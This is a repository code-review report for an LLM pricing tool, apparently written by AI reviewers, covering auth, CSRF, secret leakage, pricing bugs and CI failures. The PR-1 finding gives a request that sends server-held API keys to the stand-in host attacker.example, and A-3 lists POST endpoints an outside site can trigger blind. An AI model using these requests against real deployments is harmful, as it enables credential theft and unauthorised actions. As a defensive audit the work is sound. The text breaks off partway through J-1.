# Code review — 2026-11-05

A full-repository review written for the next session to triage and act on. Nothing in the code was changed.

- **Reviewed:** `main` at `23822cb` (the merge of `claude/priceless-khorana-0c428f`). The last recorded review was at
  `b7d253c` (2026-10-28, see `OUTSTANDING.md`); 18 commits and ~15k lines have landed since, mostly the OpenRouter
  preset, usage history, `POST /api/models/value`, open-read auth, OpenRouter routing and the OpenCode-only badge.
- **How:** a lead reviewer took auth, the app shell, config, Docker and CI, and five parallel reviewers each took one
  area (presets/usage/OpenRouter; pricing/value/snippets; providers/catalogue; jobs/benchmarks/subscriptions/DB;
  frontend shell/settings). The lead re-read the cited code for every High and most Medium findings, and re-ran the
  proofs marked **[lead-verified]**. Items already settled or recorded in `OUTSTANDING.md` are not repeated unless
  something new was found.
- **Proof scripts** were written to an ephemeral scratch directory that will not survive this session. Where a
  finding needs a reproduction, a short recipe is given inline instead.

**For the next session:** work through "Fix first", then take each area's list in order. When an item is fixed, note
the commit. When it is decided against or deferred, move it into `OUTSTANDING.md` (its "Open" or "Not outstanding"
section) with the reason, which is that file's convention. Delete this file once everything in it is either fixed or
moved there.

Severity: **High** = wrong results, a leaked secret, or broken CI in normal use. **Medium** = a real defect with a plausible trigger, or
a breach of an `AGENTS.md` rule. **Low** = an edge case, hardening, or UX. Confidence: *reproduced* (a proof ran),
*read* (confirmed by reading the code), *plausible* (depends on external behaviour not checked).

---

## Baseline (run in this session)

| Check | Result |
|---|---|
| `ruff check`, `ruff format --check` | pass |
| `pytest -q` (Python 3.12, as root, in a container with a proxied network) | 449 passed, **2 failed**: see B-3 and S-1. Both pass in GitHub CI. |
| `npm run typecheck`, `npm run lint`, `npm test` (152 tests), `npm run build` | pass |
| `npm run format:check` | **failed** on `src/components/models/ModelTable.tsx` (CI-1); passes after `683a31f` |
| GitHub CI on `main` | **red for the last 5 pushes** (runs 43–47, from `10ca321` on): frontend "Format check" fails, so the frontend Tests and Build steps have been **skipped in CI** since 2026-11-04 |
| `openapi.json` / `schema.d.ts` vs the backend | in sync (re-exported and diffed) |
| Migration head vs `orm.py` | in sync (`compare_metadata` returned `[]`) |

---

## Fix first

These have the best ratio of harm to effort.

1. **PR-1:** the draft provider test sends env-supplied keys to any `base_url` in the request. On the live instance
   (no password) that takes one POST.
2. ~~**CI-1:** run `npx prettier --write src/components/models/ModelTable.tsx`.~~ **Fixed in `683a31f`** (this
   review's PR), so the frontend tests and build run in CI again.
3. **J-1:** Claude subscription percentages ≤ 1.5 are multiplied by 100, so 1% shows as 100%.
4. **PR-2, PR-3:** a key that straddles the 300-character cut survives the scrub, and cross-origin redirects forward
   `x-api-key` (the OUTSTANDING item, now confirmed).
5. **P-1:** preset ownership is a bare slug, so a change of key or account can overwrite another account's preset.
6. **J-3:** API writes commit after the response is sent, so a failed commit still returns 2xx.
7. **J-2:** every settings save restarts every refresh and preset timer, so a 24 h job may never run.
8. **V-1:** anonymous open-read visitors can send an unbounded body to `POST /api/models/value`, and the 422 echoes
   it back.
9. **A-1 / PR-8 / PR-9:** if models.dev is unreachable with no cache, model details and provider tests return 500
   and every models refresh fails. A 200 error body from models.dev overwrites the good cache.
10. **F-1:** `tone()` fails WCAG AA in light mode for green, teal, cyan, orange, yellow and lime. This breaks an
    `AGENTS.md` rule, and it is on every score number.
11. **V-2, V-3:** copied config snippets point at the wrong host for Moonshot CN, the Z.ai coding plan, and OpenCode's
    Anthropic and Gemini models.
12. **J-4:** a future batch migration on SQLite would cascade-delete child tables. This is latent, but it is data
    loss at startup.

**Updates for `OUTSTANDING.md`** once this is triaged:
- The `follow_redirects` concern is now confirmed (PR-3).
- The sandbox concurrency, fork-bomb and leftover-file cases did run here as root (S-2).
- The live instance having no password now has a concrete consequence beyond DNS rebinding: PR-1 and A-3.

---

## Auth, app shell, config, CI, Docker (lead)

**CI-1 — High (process) — `frontend/src/components/models/ModelTable.tsx:14-22`. [lead-verified] — FIXED in `683a31f`.**
- `3b753b8` removed an import, and the multi-line import that is left now fits on one line, so Prettier wants it
  joined.
- CI's frontend job stops at "Format check". Typecheck and lint still run, but **vitest and the production build have
  not run in CI for the last five pushes**.
- They pass locally, so nothing is hidden yet, but CI is not guarding them.
- Fix: run `npx prettier --write` on the file.

**CI-2 — Low — `.github/workflows/publish.yml`.**
- A `v*` tag builds and pushes images, and creates a release, with no dependency on CI.
- With `main` red, a tag would still ship.
- Fix: gate on CI (`workflow_run`, or a required status check on the tagged commit).

**CI-3 — Low — version drift.**
- CI tests the backend on Python 3.12, while the image runs 3.13 (`docker/Dockerfile`).
- `AGENTS.md` says Node 22+, while CI and the image use 24.
- Fix: test on the version that ships, or add 3.13 to a matrix.

**A-1 — Medium — `backend/vibonomics/api/models.py:307-309`. [lead-verified, reproduced]**
- **Defect:** `model_detail` awaits `load_catalog()` before anything else, but the catalogue only supplies an
  optional description fallback.
- **Failure:** models.dev is unreachable and there is no cache file (a fresh instance, a wiped cache, or a proxied
  network). The whole model-details modal then gets a 500 (`FetchError`).
- **Latency:** when the in-memory copy expires, the first details request waits on a fetch with a 120 s timeout.
  Concurrent requests each fetch, because there is no single-flight.
- **Fix:** catch `FetchError` and go on without the description, and refresh the catalogue in the background.
- **Related:** `tests/test_routing.py::test_no_choice_is_the_default_routing` reaches the real models.dev, because
  its fixture does not stub `load_catalog` the way `tests/test_client_restricted.py:25-28` does. It failed here
  behind the proxy (B-3).

**A-2 — Low — same handler.**
- `model_detail` is `async def` only so that it can await the catalogue. It then runs `compute_scores` over every
  benchmark row, plus several queries, on the event loop.
- Every details or snippet open blocks all other requests for that time. `list_models` is a sync def, so it runs in
  the threadpool.
- This is not the sync-writes item already in `OUTSTANDING.md`.
- Fix: await the catalogue, then run the rest in `run_in_threadpool`.

**A-3 — Medium-low — blind cross-site POSTs (CSRF). `backend/vibonomics/app.py:113-126`. [lead-verified, reproduced]**
- **What is safe:** routes with a JSON body. FastAPI refuses `text/plain` with 422 (verified), so a cross-site form
  cannot reach them without a CORS preflight.
- **What is not:** the body-less POSTs are "simple requests". All of these answered 200/202 to a `text/plain` POST
  with no body:
  - `POST /api/subscription/claude/rotate`
  - `POST /api/providers/{id}/refresh`
  - `POST /api/evals/runs/{id}/cancel`
  - `POST /api/presets/list`
  - `POST /api/presets/plan` (the body is optional)
  - `POST /api/auth/logout`
- **With no password,** which is how the live instance runs (see `OUTSTANDING.md`), any web page a LAN browser
  opens can fire these blind. That needs no DNS rebinding, and `VIBONOMICS_ALLOWED_HOSTS` does not help, because the
  Host header is the real one.
- **With a password,** the `samesite=lax` cookie is still sent from same-site origins: another port on the same host,
  or a sibling subdomain behind the same proxy.
- **Impact:**
  - The ingest token is rotated, which silently breaks status-line sync.
  - Refreshes are triggered.
  - Eval runs are cancelled.
  - The preset list and plan call OpenRouter with the operator's key. This is the very thing `AGENTS.md` made them
    POSTs to prevent, although that rule was written about open-read visitors.
- **Fix:** in `auth_guard`, refuse any method other than GET/HEAD/OPTIONS when `Sec-Fetch-Site` is `cross-site`, or
  when `Origin` is present and does not match the Host. Or require a custom header that the SPA always sends.
  `tests/test_open_read.py`'s route walk can assert this too.

**A-4 — Low — `backend/vibonomics/__main__.py:30-31`.**
- `proxy_headers=True, forwarded_allow_ips="*"` trusts `X-Forwarded-For` and `X-Forwarded-Proto` from any client, so
  access logs show client IPs that anyone can spoof.
- The sandbox guard is **not** affected, because it reads `scope["server"]` (checked).
- Fix: an env var (for example `VIBONOMICS_FORWARDED_ALLOW_IPS`) whose default is the proxy, or `127.0.0.1`.

**A-5 — Low — `backend/vibonomics/api/auth.py:94-110`.**
- Login has no rate limit and no backoff.
- A session cannot be revoked except by changing the password, and logout only deletes the browser's copy of the
  cookie. A copied cookie stays valid for 30 days.
- This is acceptable for a LAN tool, but worth knowing.

**A-6 — Low — `backend/vibonomics/api/subscriptions.py:171, 204`.**
- The ingest token is accepted as `?token=`, and the UI shows `ingest_path` in that form.
- uvicorn's access log records full query strings, so the token ends up in logs.
- The status-line command uses the header, which is fine.
- Fix: header only, or at least stop advertising the query form.
- J-11 covers a related 500 on non-ASCII tokens.

**A-7 — Low — `backend/vibonomics/api/subscriptions.py:95-103`, `:141`.**
- `GET /api/subscription/claude` mints and saves a token for an authenticated caller, so it is a GET with a write.
- Harmless today, but it is the kind of thing open-read's "GET is safe" assumption rests on.

**A-8 — Low (cosmetic) — `backend/vibonomics/evals/runner.py:327`.**
- `evals.finished` is published with status `done` for a run that was just marked `failed` (`done == 0`).

---

## OpenRouter preset, usage history, OpenRouter adapter

`AGENTS.md`'s "Best-value preset" bullet is the spec here. The core promises hold (see "Checked and found fine"). The
problems are in what "owned" means and in how the config is built.

**P-1 — Medium (high impact) — `backend/vibonomics/presets.py:397-398` (`is_owned`), `:449-452` (`_access`), `:383-384`. [lead-verified by reading; reproduced by the area reviewer]**
- **Defect:** `owned` is a list of bare slugs. The account a plan reaches is decided later, by the first enabled
  OpenRouter provider that has an API key.
- **Failure:** Vibonomics created `vibonomics-best-value` on account A. Then one of these happens:
  - provider A is disabled, or its key is removed;
  - a second OpenRouter provider is added;
  - `VIBONOMICS_OPENROUTER_API_KEY` changes;
  - the key moves to another org.

  If account B has a preset with the same slug (made by another instance or by hand), the plan now says `update`,
  and apply overwrites B's preset.
- Also: a preset Vibonomics made, later deleted in OpenRouter's UI and remade by hand, still counts as owned.
- **Fix:** record ownership as (account identity, slug, and the creation id or time from the create response). The
  account identity could be a hash of `GET /key`'s identity, or the host. Check all of it on every plan, and put the
  account and the live version into `digest_of`.
- **Test gap:** nothing covers ownership across keys or accounts.

**P-2 — Medium — `presets.py:308-324` (`merge_endpoints`), `:606-612`, `:263-265`; `backend/tests/test_presets.py:666-668` asserts the current behaviour.**
- **Defect:** one `provider.only` list, capped at `max_providers` (default 3) and filled round-robin, is shared by
  every entry in `models`.
- **Failure 1:** with `max_models=5`, models 4 and 5 get no provider in `only`, and models 1–3 get one each, so there
  is no provider fallback.
- **Failure 2:** a pick with no endpoint data is listed in `models`, but `only` holds only the other picks' providers.
- If OpenRouter applies `only` to each fallback model (likely, but not verified), those fallbacks can never serve.
  Nothing warns.
- **Fix:** guarantee each pick at least one of its own endpoints, or warn or refuse. Do not set `only` when a pick has
  no endpoint data. Change the test.

**P-3 — Medium (money) — `presets.py:225`; `backend/vibonomics/providers/openrouter.py:146-157`. [lead-verified by reading]**
- **Defect:** `choose_endpoints` costs every endpoint with the model's listed `cache_read`. The adapter never stores
  each endpoint's own `input_cache_read`.
- **Failure:** take the default agentic profile (80% cache hit). An endpoint with no cache at $0.08 input ranks ahead
  of a caching endpoint at $0.10. The real cost per task is $0.056 against $0.0248, so the preset pins the endpoint
  that costs 2.3× as much first.
- **Fix:** store `input_cache_read` per endpoint and use it. When it is missing, cost the endpoint as uncached.

**P-4 — Medium (plausible) — `presets.py:270` (`provider.setdefault("allow_fallbacks", True)`), `:640`, `:651-652`, `:707`. [lead-verified by reading]**
- **Defect:** Vibonomics injects a key outside the owned set (`model` / `models` / `provider.only` / `order`) and
  compares the next plan against the live config.
- **Failure:** if OpenRouter does not store that default, or rewrites any key it was sent, every sync plans "update"
  ("the provider list changed") and writes a new version on every scheduled run. That was reproduced with a mock
  that drops the key.
- `test_presets.py:375` asserts the injected key.
- **Fix:** don't inject it. Compare only the owned keys, or remember what the last write lost and ignore it.

**P-5 — Medium-low — `presets.py:604-605`, `:213-224`.**
- **Defect:** a template's `provider.only` allow-list is replaced, not honoured. Only `quantizations` and `ignore`
  are filtered.
- **Failure:** the operator starts from a template with `only: ["deepinfra"]`, and the picker shows "only deepinfra".
  The plan writes `novita/fp4, deepinfra/fp8, wafer/bf16` with no warning.
- **Fix:** treat a template's `only` as a filter, or warn.

**P-6 — Medium-low — `presets.py:700, 705-708, 720` (write) and `:417, 421` (read).**
- **Write side:** any 2xx counts as applied and claims ownership. A 200 carrying `{"error": …}`, or no
  `designated_version`, is recorded as "Created … as version None", and the slug is added to `owned`.
- **Read side:** if a preset's GET lacks `designated_version`, the plan builds from `{}`. The write would then drop
  every field the operator set, and the diff hides it, because it is compared with `{}`.
- **Fix:**
  - Claim ownership only when the response carries a version and the matching slug.
  - Block the plan when a preset exists but its live config cannot be read.

**P-7 — Low-medium — churn.**
- **Cause 1** (`presets.py:229-231`): endpoints with equal prices are ordered by `uptime_1d`, which changes on every
  models refresh. `provider.order` flips, and a new version follows.
- **Cause 2** (`providers/openrouter.py:139-141, 158`; `jobs.py:258` replaces `extra` wholesale): a failed
  `/endpoints` lookup, or turning off `openrouter_endpoint_discounts`, leaves the model with no `endpoints`. The next
  sync drops `only`/`order` (unpinning the preset), and the next good refresh puts them back. That is two versions,
  and with auto-apply the warning is never seen.
- **Fix:**
  - Break ties stably in favour of the current providers.
  - Keep the last known endpoints when a lookup fails.
  - Skip the write when a pick that had endpoint data now has none.

**P-8 — Low-medium (secret) — `backend/vibonomics/jobs.py:412-413`, `presets.py:451`. [lead-verified by reading]**
- **Defect:** usage sends the management key, and the preset sends the API key, to the provider row's optional Base
  URL override. The adapter's own balance and model calls always use the fixed OpenRouter host
  (`providers/openrouter.py:72, 187, 210`).
- **Failure:** the operator points OpenRouter's Base URL at a gateway meant for clients. The account-wide management
  key, which can create and delete keys, is then sent to that gateway.
- This is the same class of leak as F7 in the previous review.
- **Fix:** use the spec's host for these calls, or refuse a host other than openrouter.ai.

**P-9 — Low-medium (UX) — `backend/vibonomics/usage.py:380-381`; `frontend/src/pages/UsagePage.tsx:159, 175-193`.**
- **Defect:** picking a key with no stored rows returns `keys: []`, and the page then hides the key Select. The only
  way back to "All keys" is to navigate away.
- **Fix:** compute `keys` before the early return.

**P-10 — Low — `presets.py:691-704, 719-721`.**
- **Defect:** when a create succeeds on OpenRouter but its response is lost (a read timeout, a body that is not
  JSON, cancellation), the preset exists but is not owned. Every later plan is then blocked with "Vibonomics did not
  create it".
- **Fix:** after an ambiguous failure, re-read the preset, and adopt it if its live config equals `plan.config`.

**P-11 — Low — `jobs.py:414`, `usage.py:149-177`.**
- **Defect:** the per-key activity fetches share the aggregate fetch's single 300 s `wait_for`.
- **Failure:** an account with many keys loses even the aggregate rows that had already arrived.
- **Fix:** persist the aggregate first, or give the per-key phase its own time budget.

**P-12 — Low (money) — `usage.py:253-256`.**
- **Defect:** BYOK spend is left out of Spend and out of cost per 1M tokens, but BYOK tokens are counted.
  `byok_cost` is returned and shown nowhere.
- **Failure:** an account that mostly uses its own provider keys shows an absurdly low $/Mtok.

**P-13 — Low — `backend/vibonomics/orm.py:219, 241`; `frontend/src/pages/settings/ProvidersSection.tsx:567-568`.**
- **Delete:** deleting an OpenRouter provider cascade-deletes all of its stored spend history. That history cannot
  be recovered beyond OpenRouter's 30 days, and the delete dialog does not say so.
- **Double count:** two provider rows with the same management key double the "All accounts" totals.

**P-14 — Low (plausible, open-read) — `usage.py:136`; `providers/openrouter.py:188`.**
- **Defect:** a key's display name falls back to OpenRouter's `label`, which the repo's own fixture models as a
  masked key (`sk-or-v1-abc...xyz`). `balance.key_label` is stored the same way.
- **Failure:** both reach open-read visitors, while `GET /api/providers` deliberately withholds `api_key_hint` from
  them.
- **Fix:** use `Key <hash[:8]>`, and withhold `key_label` from visitors.

**P-15 — Low — `scheduler.py:65-67`, `app.py:42-45`.**
- The preset schedule also resets on every restart, and nothing runs it at startup. On an instance that restarts
  daily, a 24 h auto-apply never fires. See also J-2.

**Unverifiable without a live OpenRouter account:**
- that `POST /presets/{slug}/chat/completions` creates a version and runs no inference;
- that `provider.only` applies to each entry in `models`;
- whether `allow_fallbacks: true` is stored;
- whether `GET /keys` returns `last_used_at`. If it does not, `usage.py:176` skips every per-key fetch, and all spend
  shows as "Other".

---

## Price maths, `POST /api/models/value`, snippets, the Models table

**V-1 — Medium — `backend/vibonomics/api/value.py:251-252` (and `api/auth.py:29`). [lead-verified, reproduced]**
- **Defect:** this is the one POST open-read visitors may call, and its body has no size cap. `max_length=200` is
  checked only after FastAPI has parsed the whole body.
- **Failure:** the 422 echoes the full `input`. Here, an anonymous 2.6 MB request returned a 2.5 MB 422. The area
  reviewer measured a 95 MB body taking about 475 MB of RSS and producing a 94.8 MB response. Repeat that and the
  process runs out of memory.
- **Fix:** cap Content-Length and the streamed body. Reuse `_read_capped` from `api/subscriptions.py`; about 128 KB
  is plenty. Return a short 422 without `input`.

**V-2 — Medium — `backend/vibonomics/api/models.py:259`, against `providers/moonshot.py:51-54` and `providers/zai.py:140-143`. [lead-verified by reading]**
- **Defect:** `build_snippets` uses `resolved.base_url or spec.default_base_url`, not the adapter's `base_url`
  property.
- **Failure:**
  - Moonshot with `region: cn`: the adapter calls `api.moonshot.cn`, but the curl, Python, Continue, Zed, Goose,
    Crush, Cline and Claude Code snippets all get `api.moonshot.ai`.
  - Z.ai with `endpoint: coding`: snippets get `/api/paas/v4` instead of `/api/coding/paas/v4`.
  - Both providers' option text says a key works only on its own platform, so the copied config fails with 401, or
    bills the wrong plan.
- The OpenCode and Kilo tabs are right, because they go through `modelsdev_provider`.
- **Fix:** take `ctx.base_url` (and the CN Anthropic root) from the adapter.

**V-3 — Medium — `api/models.py:259,266`, `backend/vibonomics/snippets.py:468-471`, against `providers/opencode.py:274-292`.**
- **Defect:** OpenCode models are served per model, on the OpenAI, Anthropic or Gemini route (models.dev `npm` /
  `api`), but every snippet points at `/inference/openai/v1`.
- **Failure:**
  - For `claude-opus-5-5`, the adapter calls `/inference/anthropic/v1`, while the snippets say chat completions.
  - There is no Claude Code tab.
  - Gemini models get a chat-completions curl that the adapter itself refuses.
- **Fix:** pass the per-model endpoint and wire into `SnippetContext`, or skip the harnesses that use the OpenAI wire
  for those models.

**V-4 — Medium-low — `backend/vibonomics/scoring.py:94,115,191`. [lead-verified by reading]**
- **Defect:** `own_test_scores` groups by `(provider_config_id, model_id)` but selects `EvalResult.canonical_id` as a
  bare column. That value was saved at test time and is never updated, and SQLite picks one arbitrarily when runs
  differ.
- **Failure:** a model is tested while unmatched, and is later matched by models.dev. Its own test then drops out of
  the composite, coding and agentic scores, and out of `scores.own_test` in `/value`. The row still shows a test
  summary.
- **Fix:** join `Model` on `(provider_config_id, model_id)`, and key by `Model.canonical_id`.

**V-5 — Low-medium — `value.py:208-219`, `ValueRow` at `:87-116`.**
- **Defect:** `/value` can pick an OpenCode-only free model (`client_restricted`) for a program that will get 403
  from it. The UI badges these rows; the API says nothing.
- **Fix:** add an optional `client_restricted` field (an additive change, so the contract holds), and make such rows
  ineligible by default.

**V-6 — Low — `backend/vibonomics/settings_store.py:41-42`.**
- **Defect:** a usage profile can have 0/0 tokens (`ge=0`, with no non-empty check), although the same task given
  inline is refused (`value.py:55-59`).
- **Failure:** every `task_cost` is then 0 and every value is null or infinite, and the UI gives every scored row
  index 100.
- **Fix:** apply the same validator to `UsageProfile`.

**V-7 — Low — `value.py:278-293`.**
- **Defect:** a model named twice is ranked against itself ("Next is <the same model>").
- **Fix:** dedupe by the resolved `Model.id`.

**V-8 — Low — `frontend/src/lib/modelTable.ts:93-94` (with "Non-batch only" on by default at `:244`).**
- **Defect:** the value index and tiers are computed over every row, including the ones the default filter hides.
- **Failure:** hidden `:batch` copies take the top ranks, so the best visible model shows index 47.7, tier "Rest".
- **Fix:** compute after `filterModels` and `foldOpenCodeOffers`.

**V-9 — Low — `value.py:202`.**
- **Defect:** `task_cost` is rounded to 6 decimal places while `value` is not. A 5-token task returns
  `task_cost: 0.0` with a finite `value`, so a client that computes `score / task_cost` divides by zero.
- **Fix:** round to significant figures instead.

**V-10 — Low — `snippets.py:132,137`.**
- **Defect:** the YAML and TOML scalar quoting uses `ensure_ascii=False`.
- **Failure:** a model id containing DEL (`\x7f`) makes the Continue, Aider, Goose and Codex snippets fail to parse.
  Model ids come from third-party endpoints.
- **Fix:** `ensure_ascii=True`; `\uXXXX` is valid in both formats.

**V-11 — Low — the frontend formatting and sorting:**
- `frontend/src/lib/format.ts:29`: `money(5e-7)` renders "$5e-7".
- `frontend/src/lib/modelTable.ts:66-75`: free rows show the benchmark's reported cost in $/task (for example $0.80
  on a `:free` row), and sort among the paid models.
- `api/models.py:372`: other offers with unknown prices sort as the cheapest (`(input or 0) + (output or 0)`).
- `frontend/src/pages/ModelsPage.tsx:279`: "Showing N of M" counts rows before OpenCode offers are folded.

---

## Providers, catalogue, HTTP client

**PR-1 — High (secret) — `backend/vibonomics/api/providers.py:277-296` with `backend/vibonomics/provider_service.py:21-23`. [lead-verified, reproduced]**
- **Defect:** `POST /api/providers/test` (testing a draft) builds a transient row from the form and passes it through
  `resolve()`. `resolve()` puts the `VIBONOMICS_*_API_KEY` / `_MGMT_KEY` / `_EXTRA_KEY` environment values **over**
  the form's keys, while `base_url` comes straight from the body. The F7 origin check (`_withhold_stored_keys`) covers
  only `/{id}/test`.
- **Failure 1:** with `VIBONOMICS_GROQ_API_KEY` set,
  `POST /api/providers/test {"type":"groq","base_url":"https://attacker.example/v1"}` sends
  `Authorization: Bearer <env key>` to the attacker. Reproduced.
  - The same holds for every adapter that calls `self.base_url`: cerebras, custom-openai, fireworks, moonshot,
    together, nvidia, zai, and requesty's fallback.
  - The response also reflects up to 300 characters of the target's error body, so this doubles as a small SSRF
    read.
- **Failure 2:** a key typed into the form is silently replaced by the env key, so "Key accepted" describes the
  wrong key. Reproduced.
- **Reach:**
  - On the live instance (no password, no allowed hosts), any LAN client can do this in one POST, and so can a
    DNS-rebinding page. Nothing is written to the database.
  - With a password, any logged-in session can extract env keys that the UI presents as "locked".
  - Open-read visitors cannot (it is a POST).
- **Fix:**
  - Build the draft `ResolvedProvider` from the body only, with no env lookup, trimmed like `_trimmed`.
  - If env keys are meant to be testable, test them only against the spec's default host.
  - Add a regression test with an env key and a foreign `base_url`.

**PR-2 — Medium (secret) — `backend/vibonomics/http.py:109`. [lead-verified, reproduced]**
- **Defect:** `scrub_secrets(resp.text[:300]…)` truncates first and scrubs second. A key the remote echoes back across
  the 300-character cut no longer matches in full, so it is not replaced.
- **Failure:** a 401 body that echoes the key from about character 263 yields a message ending
  `…sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWX` (37 of 58 characters).
- **Where it goes:** that text lands in `last_refresh_message`, which `GET /api/providers` returns to open-read
  visitors, and in balance messages, run messages, test results and logs.
- **Fix:** `scrub_secrets(resp.text, headers, params)[:300]`. The same applies wherever else text is truncated
  before it is scrubbed.

**PR-3 — Medium — `follow_redirects=True` (the OUTSTANDING item, now confirmed) — `http.py:27`, `backend/vibonomics/evals/llm.py:97`. [lead re-ran the proof]**
- With httpx 0.28.1, a 302 to a different origin delivered `x-api-key` and `x-goog-api-key` to the second server,
  while `Authorization` was dropped.
- **Who sends those headers:** Anthropic and Google send them only to hard-coded vendor hosts in the adapters, but
  Anthropic's `chat_target` gives the eval client `x-api-key` together with `self.base_url`. A base URL override that
  redirects therefore forwards the key.
- **Fix:** strip every secret header on a cross-origin redirect (an httpx event hook), or use
  `follow_redirects=False` for keyed calls.
- Move this item in `OUTSTANDING.md` from "could not confirm" to confirmed.

**PR-4 — Medium (money) — `backend/vibonomics/providers/pricing_pages.py:27` (`_STRIKE`), `:56`, `:74`.**
- **Defect:** a strikethrough promo is parsed only when `~~` follows the number directly. Otherwise the parser takes
  the first `$` in the cell, which is the struck list price.
- **Failure:** `parse_price_cell("~~$15 / MTok~~ $7.50 / MTok")` returns 15.0, and `"~~$4.00~~ Free"` returns 4.0.
  Anthropic writes every cell as `$X / MTok`, so a promo there would show the list price as the live price, with no
  discount.
- **Who is affected:** this parser is shared by Anthropic, OpenAI, xAI, OpenCode and Gemini.
- **Fix:**
  - Split on `~~(.*?)~~` and parse each part.
  - Read a remainder that starts with "free" as 0.
  - If the `~~` cannot be paired, return None, so the offer keeps the models.dev price.

**PR-5 — Medium (money) — `backend/vibonomics/providers/moonshot.py:92`; `providers/deepseek.py:161,175`; `frontend/src/components/models/BalanceBody.tsx:28`; `frontend/src/lib/format.ts:6-16`.**
- **Defect:** Moonshot (China) and DeepSeek can report CNY balances, but the frontend always prints `$` and never
  reads `balance.currency`.
- **Failure:** ¥350 renders as "$350 left", which overstates it about 7×.
- **Fix:** pass the currency to `money()`.

**PR-6 — Medium — `pricing_pages.py:146-157` (`_loose_offer`) with `backend/vibonomics/catalog/modelsdev.py:101`.**
- **Defect:** loose matching strips any date or version suffix from both sides.
- **Failure:** a new dated release on the pricing page (`mistral-large-2512`) reprices the older snapshot that
  models.dev still lists (`-2411`).
- **Fix:** allow dropping the suffix only when one side has none.

**PR-7 — Medium-low — `catalog/modelsdev.py:94-97` (`guess_canonical`).**
- **Defect:** it returns the first date-stripped match, so `deepseek-v4.1-flash-free` maps to
  `deepseek/deepseek-v4.1-flash-1017` although the undated `deepseek/deepseek-v4.1-flash` exists.
- **Failure:** OpenCode's unknown `-free` ids go through this function (`opencode.py:175`), so the free model gets a
  different snapshot's scores from its paid sibling.
- **Fix:** try an exact match first, then prefer an undated id. Return None on a tie.

**PR-8 — Medium-low — models.dev being unreachable. `api/providers.py:360`; `http.py:147-151`; `jobs.py:153, 299`.**
- **Defect:** this is the same root cause as A-1. When the catalogue cannot be fetched and there is no cache:
  - provider tests return 500 (`load_catalog()` runs before the `try`);
  - **every models refresh fails before any provider runs**, including OpenRouter, Cerebras, Requesty and Chutes,
    which don't need the catalogue.
- **Fix:** with no cache, return an empty `ModelsDevCatalog` and flag the problem, rather than raising.

**PR-9 — Medium-low — `http.py:152-156`; `catalog/modelsdev.py:124`.**
- **Defect:** any 200 JSON response overwrites the good cache file.
- **Failure:** models.dev answers 200 `{"error": "…"}`. Every adapter based on models.dev then returns 0 models with
  status "ok", `persist_offers` marks all their rows inactive, and the offline fallback now holds the error body.
  Reproduced.
- **Fix:** validate the shape before caching (a dict with providers that have `models`). Otherwise raise
  `FetchError`, so the cached copy is used.

**PR-10 — Low — `backend/vibonomics/providers/anthropic.py:174`. [lead-verified, reproduced]**
- **Defect:** the condition is backwards. On every day except the 31st, `thirty_start <= month_start`, so the
  trailing 30-day window is longer than the month, yet month-to-date is reused for it.
- **Failure:** "Last 30 days" always equals month-to-date, and `BalanceBody` then hides it.
- `tests/providers/test_batch_a.py:76-89` bakes this in, because one mock serves both windows.
- **Fix:** always fetch the trailing window, or reuse month-to-date only when the two starts are equal.

**PR-11 — Low.** Clearing an option or the base URL changes what Save stores but not what Test checks. This is the
backend half of F-3: `api/providers.py:352` merges `body.options` over the stored options instead of replacing them.
Reproduced for Moonshot with `region: cn` cleared.

**PR-12 — Low — `anthropic.py:30-61` with `pricing_pages.py:165-171`.**
- **Defect:** the Anthropic parser does not keep the first table. A later table with the same headers (for example a
  priority tier) silently overrides the standard prices.
- OpenAI, xAI and OpenCode already dedupe.
- Reproduced with a synthetic page; whether the live page has such a table was not checked.

**PR-13 — Low — `backend/vibonomics/providers/deepseek.py:45, 30-34, 87-90`.**
- **Colspan:** a price cell shared across columns (`colspan`) gives the second model no page price, and no
  `pricing_page_error` is raised.
- **Max output:** `"DEFAULT: 4K MAXIMUM: 8K"` sets `max_output` to 4000.

**PR-14 — Low — `http.py:129-134` (`_redact` only handles `key=`); `api/providers.py:186, 212-214`.**
- **Defect:** credentials inside a URL are not redacted.
- **Failure:** `https://admin:pass@gw/v1`, or a `?token=` query, ends up in error messages, run messages and logs.
  `GET /api/providers` also returns the raw `base_url` to open-read visitors.
- **Fix:** strip the userinfo and the query in `_redact`, and blank both in `ProviderOut.base_url` for visitors.

**PR-15 — Low — `backend/vibonomics/providers/opencode.py:274-284`.**
- **Defect:** the per-model `endpoint.api` comes from models.dev, a community-edited catalogue fetched at runtime,
  and it is used with no host check.
- **Failure:** one bad entry would send the OpenCode key to another host during evals or judge calls.
- **Fix:** accept the endpoint only if its origin is `opencode.ai`.

**PR-16 — Low (maintainability) — duplicated glue around pricing pages.**
- **Duplication:** the "fetch the page → apply → `pricing_page_error`" block is copied in seven adapters. `_size`,
  `_per_million`, `_STRIKE`, `_normalise` and `_price` are each copied 2–3 times.
- **Drift:** in five of them (`groq.py:168`, `moonshot.py:62`, `fireworks.py:158`, `together.py:126`,
  `requesty.py:65`), a failed live `/models` list raises and discards the good prices from the docs. The other seven
  catch the same failure.
- **Fix:** one shared helper for the page overlay, and one for an optional live list.

**Minor (low):**
- `crypto.py:64-66`: after the secret key changes, `InvalidToken` makes every stored key read as "not set", silently,
  with no log.
- `provider_service.py:21-23`: env keys apply per type, so `VIBONOMICS_CUSTOM_OPENAI_API_KEY` goes to every custom
  endpoint on every host.
- `api/providers.py:385, 394`: these return 202 "started" even when `run_job` dropped the call (J-6).
- `google.py:64`: `(parse_price_cell(free_cell)[0] or 1) == 0` is always False, so a "$0.00" free tier is missed.
- `google.py:26`: "context caching storage", priced per hour, is mapped to `cache_write`.
- `fireworks.py:71-74`: any display name containing "Fast" becomes a `…-fast` router id.
- `pricing_pages.py:43-56`: promo end dates are never enforced, so an expired promo keeps its price.

**Checked and found fine in this area:**
- `_withhold_stored_keys` resisted userinfo, fragment, backslash, tab/newline, explicit-port, scheme-change and
  case-change tricks.
- Unit conversions (per-token ×1e6, cents/100, xAI's negative cents, Fireworks' units + nanos) are correct, and so is
  the discount maths.
- Parsers degrade to "no pricing rows matched" rather than raising.
- No adapter logs headers.
- Fernet is used correctly, and hints are blanked for visitors.
- Unseen rows are deactivated.
- Provider refreshes send one request per set.

---

## Jobs, scheduler, benchmarks, subscriptions, database

**J-1 — High — `backend/vibonomics/subscriptions.py:48` (used at `:80` and `:154`). [lead-verified, reproduced]**
- **Defect:** `_usage()` multiplies any value ≤ 1.5 by 100. But Claude Code's status-line `used_percentage` is
  already "from 0 to 100" (the statusline docs at code.claude.com, checked today), for the 5-hour and 7-day windows
  and for `context_window`.
